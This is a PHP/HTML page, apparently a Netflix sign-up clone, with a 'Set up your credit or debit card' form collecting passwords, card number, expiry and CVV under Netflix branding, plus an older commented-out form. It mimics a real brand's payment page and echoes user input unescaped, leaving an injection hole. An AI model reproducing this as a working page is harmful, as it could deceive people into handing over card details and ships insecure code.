<?php include('server.php') ?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link href="css/registar1.css" rel="stylesheet"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

</head>
<body>
    <header>
        <nav>
            <a href="index_test.html" class="logo">
                <img src="img/logo.svg">
            </a>

            <a class="signin" href="index_test.html">
                Sign Out
            </a>
        </nav>
    </header>

    <div class="content-2">
        <p class="step">STEP <b>3</b> OF <b>3</b></p>
        <p class="instruction">Set up your credit or debit card.</p>
        <p class="introce">Just a few more steps and you're done!<br>We hate paperwork, too.</p>
        <img class="image2" src="img/visa-v2.svg" alt="image display">
        <img class="image2" src="img/mastercard-v2.svg" alt="image display">
        <img class="image2" src="img/amex-v2.svg" alt="image display">
        <img class="image2" src="img/icon_discover_2x.png" alt="image display">

        <form method="post" action="creditoption.php">
        <div class="modal-body">
          <?php include('errors.php'); ?>
            <div class="credit_input">
                <div class="input-group home_email_input1">
                    <input type="text" name="first_name" placeholder="First Name" value="<?php echo $first_name; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="last_name" placeholder="Last Name" value="<?php echo $last_name; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="email" placeholder="Email" value="<?php echo $email; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="password" placeholder="Enter Your Password" name="password_1">
                </div>
                <div class="input-group home_email_input1">
                    <input type="password" placeholder="Confirm Your Password" name="password_2">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="zip_code" placeholder="Billing Zip Code" value="<?php echo $zip_code; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="card_number" placeholder="Card Number" value="<?php echo $card_number; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="expire_date" placeholder="Expiration Date (MM/YY)" value="<?php echo $expire_date; ?>">
                </div>
                <div class="input-group home_email_input1">
                    <input type="text" name="cvv" placeholder="Security Code (CVV)" value="<?php echo $cvv; ?>">
            </div>

            <div class="row  plan_choice">
                <div class="col">
                    <div class="row">
                        <b>$17.99/mo.</b>
                    </div>
                    <div class="row plan">
                        Premium Plan
                    </div>
                </div>

                <div class="col change">
                    <a href="https://help.netflix.com/legal/termsofuse"><span>Change</span></a>
                </div>

            </div>

            <div class="row">
                <p class="warning_text">
                By clicking the "Start Membership" button below, you agree to our
                <a href="https://help.netflix.com/legal/termsofuse"><span>Terms of Use</span></a>,
                <a href="https://help.netflix.com/legal/privacy"><span>Privacy Statement</span></a>, 
                that you are over 18, and that 
                <b>Netflix will automatically continue your membership and charge the monthly membership fee 
                    (currently $13.99) to your payment method until you cancel. 
                    You may cancel at any time to avoid future charges.</b> To cancel, go to Account and click "Cancel Membership."
                </p>
            </div>

          <div class="input-group">
            <button type="submit" class="continue2" name="register">START MEMBERSHIP</button>
          </div>
        </div>
      </form>

        <!-- <form>
            <input type="text" class="form-control home_email_input1" placeholder="First Name">
            <input type="text" class="form-control home_email_input1" placeholder="Last Name">
            <input type="text" class="form-control home_email_input1" placeholder="Email">
            <input type="text" class="form-control home_email_input1" placeholder="Password">
            <input type="text" class="form-control home_email_input1" placeholder="Billing Zip Code">
            <input type="text" class="form-control home_email_input1" placeholder="Card Number">
            <input type="text" class="form-control home_email_input1" placeholder="Expiration Date (MM/YY)">
            <input type="text" class="form-control home_email_input1" placeholder="Security Code (CVV)">
            <div class="row  plan_choice">
                <div class="col">
                    <div class="row">
                        $17.99/mo.
                    </div>
                    <div class="row">
                        Premium Plan
                    </div>
                </div>

                <div class="col">
                    <a href="https://help.netflix.com/legal/termsofuse"><span>Change</span></a>
                </div>

            </div>

            <div class="row">

            </div>

            <div class="row">
                <p>
                By clicking the "Start Membership" button below, you agree to our
                <a href="https://help.netflix.com/legal/termsofuse"><span>Terms of Use</span></a>,
                <a href="https://help.netflix.com/legal/privacy"><span>Privacy Statement</span></a>, 
                that you are over 18, and that 
                <b>Netflix will automatically continue your membership and charge the monthly membership fee 
                    (currently $13.99) to your payment method until you cancel. 
                    You may cancel at any time to avoid future charges.</b> To cancel, go to Account and click "Cancel Membership."
                </p>
            </div>

            <div class="row">
                <button type="submit" class="continue1" name="continue">
                <a href="registar2.php" class="transfer_link">CONTINUE</a></button>
            </div>

            <div class="row">
            This page is protected by Google reCAPTCHA to ensure you're not a bot. Learn more.
            </div>

        </form> -->
    <div>


    <footer class="center">
      <div class="size-90">
        <p class="phonenum">
          Questions? Call <a href="tel:1-844-505-2993">1-844-505-2993</a>
        </p>

        <ul class="columns flex-wrap">
          <li class="column is-25">
            <a href="https://help.netflix.com/support/412"><span>FAQ</span></a>
          </li>
          <li class="column is-25">
            <a href="https://help.netflix.com"><span>Help Center</span></a>
          </li>
          <li class="column is-25">
            <a href="https://help.netflix.com/legal/termsofuse"><span>Terms of Use</span></a>
          </li>
          <li class="column is-25">
            <a href="https://help.netflix.com/legal/privacy"><span>Privacy</span></a>
          </li>
          <li class="column is-25">
            <a href="https://help.netflix.com/legal/privacy#cookies"><span>Cookie Preferences</span></a>
          </li>
          <li class="column is-25">
            <a href="https://help.netflix.com/legal/corpinfo"><span>Corporate Information</span></a>
          </li>
        </ul>

        <div id="lang-selection">
          <i class="fa fa-globe" aria-hidden="true"></i>
          <select tabindex="0">
            <option value="es">Español</option>
            <option selected value="en">English</option>
          </select>
        </div>
      </div>
    </footer>
</body>
</html>